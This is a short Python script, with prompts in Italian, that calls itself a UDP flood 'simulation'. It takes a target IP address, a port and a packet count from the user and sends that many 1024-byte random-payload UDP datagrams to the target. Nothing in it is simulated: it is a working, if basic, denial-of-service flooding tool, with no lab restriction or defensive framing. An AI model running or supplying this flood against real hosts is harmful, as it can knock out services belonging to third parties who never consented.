import socket
import random
import argparse

def main():
    print("Simulazione delle inondazioni UDP")

    target_ip = input("Immettere l'indirizzo IP di destinazione: ")

    try:
        target_port = int(input("Inserisci la porta UDP di destinazione: "))
        if target_port < 1 or target_port > 65535:
            raise ValueError("Numero di porta non valido")
    except ValueError as e:
        print(f"Error: {e}")
        return

    try:
        packet_count = int(input("Immettere il numero di pacchetti da inviare: "))
        if packet_count <= 0:
            raise ValueError("Il conteggio dei pacchetti deve essere positivo")
    except ValueError as e:
        print(f"Error: {e}")
        return

    print(f"Preparazione per l'invio {packet_count} i pacchetti a {target_ip}:{target_port}...")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    packet_size = 1024  
    packet = random.randbytes(packet_size)

    try:
        for i in range(packet_count):
            sock.sendto(packet, (target_ip, target_port))
            print(f"Pacchetto inviato {i+1}/{packet_count}")
        print("Tutti i pacchetti inviati.")
    except Exception as e:
        print(f"Si è verificato un errore durante l'invio dei pacchetti: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    main()
